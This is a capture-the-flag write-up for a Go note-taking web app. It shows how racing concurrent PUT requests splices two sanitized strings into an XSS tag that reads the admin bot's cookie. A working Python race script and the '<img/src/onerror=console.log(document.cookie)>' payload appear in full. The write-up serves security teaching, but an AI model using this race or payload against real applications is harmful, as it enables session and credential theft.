# `&lt;\w+` Writeup

## Overview

The challenge is a Go note-taking web application. Users can create notes, edit existing notes, and submit a note ID to an admin bot.

At first glance, the challenge looks like a simple sanitizer bypass / XSS challenge. The note content is sanitized and then served back as `text/html`, while the admin bot stores the flag in a non-HttpOnly cookie. Therefore, the goal is to execute JavaScript in the admin bot's browser and log the cookie with:

```js
console.log(document.cookie)
```

The final solution, however, is not a normal HTML sanitizer bypass. The intended issue is a race condition in the `PUT /notes/<id>` endpoint, which allows us to build a dangerous HTML tag inside the note file after sanitization.

## Source Code Analysis

The application sanitizes the note content using the following logic:

```go
func sanitizer(msg string) (string, error) {
    if len(msg) > 128 {
        return "", fmt.Errorf("too long message")
    }

    if utf8.ValidString(msg) == false {
        return "", fmt.Errorf("invalid character")
    }

    sanitized := bluemonday.StrictPolicy().Sanitize(msg)

    sanitized = strings.ReplaceAll(sanitized, "&lt;", "<")
    sanitized = strings.ReplaceAll(sanitized, "&gt;", ">")

    var reHTML = regexp.MustCompile(`<(/)?\w+`)
    sanitized = reHTML.ReplaceAllString(sanitized, "")

    return sanitized, nil
}
```

The sanitizer first uses `bluemonday.StrictPolicy()`, which removes real HTML tags. Then it manually converts `&lt;` and `&gt;` back into `<` and `>`. Finally, it removes strings matching:

```regex
<(/)?\w+
```

This means direct payloads such as:

```html
&lt;img src=x onerror=console.log(document.cookie)&gt;
```

do not work, because after `&lt;` is converted to `<`, the regex removes `<img`, leaving only broken text.

The note is then served as HTML:

```go
w.Header().Set("Content-Type", "text/html;charset=utf-8")
w.Write(data)
```

So if we can somehow get a valid HTML tag into the stored note, it will be parsed by the browser.

## Admin Bot

The admin bot sets the flag as a cookie:

```ts
await ctx.browserContext.setCookie({
  name: 'FLAG',
  value: ctx.job.flag,
  domain: APP_HOST,
  path: '/',
})
```

The cookie is not marked as `httpOnly`, so JavaScript can read it using:

```js
document.cookie
```

The bot also records console output, so the intended exfiltration method is:

```js
console.log(document.cookie)
```

## Failed Direct Sanitizer Bypass

A payload like this can bypass the regex visually:

```html
&lt;​svg onload=console.log(1337)&gt;
```

where there is a zero-width character between `<` and `svg`.

After sanitization it becomes:

```html
<​svg onload=console.log(1337)>
```

The regex does not remove it because the character after `<` is not `\w`.

However, this does not execute in Chromium. The browser does not treat it as a real HTML tag because a valid tag needs the tag name to start immediately after `<`.

So this is only a sanitizer bypass, not a working XSS.

## The Real Bug: Race Condition in PUT

The important endpoint is the edit endpoint:

```go
func editNoteHandler(w http.ResponseWriter, r *http.Request) {
    id := strings.TrimPrefix(r.URL.Path, "/notes/")

    _, err := uuid.Parse(id)
    if err != nil {
        http.Error(w, "Invalid note ID", http.StatusBadRequest)
        return
    }

    err = r.ParseForm()
    if err != nil {
        http.Error(w, "Invalid form data", http.StatusBadRequest)
        return
    }

    sanitized, err := sanitizer(r.FormValue("message"))
    if err != nil {
        http.Error(w, err.Error(), http.StatusBadRequest)
        return
    }

    filePath := fmt.Sprintf("/app/notes/%s", id)

    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        http.Error(w, "Note not found", http.StatusNotFound)
        return
    }

    f, err := os.OpenFile(filePath, os.O_WRONLY|os.O_TRUNC, 0644)
    if err != nil {
        http.Error(w, "Unable to open note", http.StatusInternalServerError)
        return
    }
    defer f.Close()

    _, err = f.Write([]byte(sanitized))
    if err != nil {
        http.Error(w, "Unable to write note", http.StatusInternalServerError)
        return
    }

    http.Redirect(w, r, "/notes/"+id, http.StatusSeeOther)
}
```

The bug is that multiple `PUT` requests can write to the same note file at the same time. There is no lock around:

```go
os.OpenFile(filePath, os.O_WRONLY|os.O_TRUNC, 0644)
f.Write([]byte(sanitized))
```

This allows two requests to race against each other.

## Exploitation Idea

We spam two different `PUT` requests to the same note ID.

The first request writes:

```text
&lt;
```

After sanitization this becomes:

```html
<
```

The second request writes:

```html
Bimg/src/onerror=console.log(document.cookie)>
```

This payload does not contain `<`, so the regex does not modify it. It gets stored as:

```html
Bimg/src/onerror=console.log(document.cookie)>
```

If the race happens in the correct order:

1. Request 1 opens the file with `O_TRUNC`.
2. Request 2 opens the file with `O_TRUNC` and writes:

```html
Bimg/src/onerror=console.log(document.cookie)>
```

3. Request 1 then writes `<` at offset `0`, overwriting the first byte `B`.

The final file becomes:

```html
<img/src/onerror=console.log(document.cookie)>
```

This is valid enough for Chromium to parse as an image tag with an `onerror` handler. Since the image source is invalid, the `onerror` fires and logs the cookie.

## Exploit Script

```python
#!/usr/bin/env python3
import re
import sys
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = sys.argv[1].rstrip("/")

P1 = "&lt;"
P2 = "Bimg/src/onerror=console.log(document.cookie)>"

s = requests.Session()

# Create an initial note
r = s.post(
    BASE + "/create",
    data={"message": "test"},
    allow_redirects=False,
    timeout=5,
)

loc = r.headers.get("Location", "")
m = re.search(r"/notes/([0-9a-fA-F-]{36})", loc)

if not m:
    print("Could not get note ID")
    print(r.status_code, r.headers, r.text[:200])
    sys.exit(1)

note_id = m.group(1)
note_url = BASE + "/notes/" + note_id

print("[+] note id:", note_id)
print("[+] note url:", note_url)

def put_payload(payload):
    try:
        s.put(
            note_url,
            data={"message": payload},
            allow_redirects=False,
            timeout=3,
        )
    except Exception:
        pass

def check():
    try:
        return s.get(note_url, timeout=3).text
    except Exception:
        return ""

for round_no in range(1, 10000):
    with ThreadPoolExecutor(max_workers=40) as ex:
        futures = []

        for _ in range(40):
            futures.append(ex.submit(put_payload, P1))
            futures.append(ex.submit(put_payload, P2))

        for f in as_completed(futures):
            pass

    body = check()

    if body.startswith("<img"):
        print("[+] SUCCESS")
        print("[+] final body:", repr(body))
        print("[+] submit this UUID to the admin bot:")
        print(note_id)
        break

    if round_no % 10 == 0:
        print("[*] round", round_no, "body:", repr(body[:100]))
else:
    print("[-] failed")
```

Run it with:

```bash
python3 race.py https://challenge-url
```

Once the stored note becomes:

```html
<img/src/onerror=console.log(document.cookie)>
```

we submit only the UUID to the admin bot.

The bot visits:

```text
/notes/<uuid>
```

The XSS executes in the bot's browser and the flag appears in the admin bot logs through `console.log(document.cookie)`.

## Conclusion

The interesting part of this challenge is that the sanitizer itself is not directly bypassed into executable HTML. Direct attempts to create tags fail because the regex removes `<tag` patterns, and tricks like zero-width spaces do not execute in Chromium.

The actual vulnerability is in the file writing logic of the edit endpoint. Because the application allows concurrent `PUT` requests to truncate and write the same file without locking, we can race two safe sanitized strings and combine them into a dangerous HTML tag after sanitization.

Final payload in the stored note:

```html
<img/src/onerror=console.log(document.cookie)>
```

Final exfiltration:

```js
console.log(document.cookie)
```
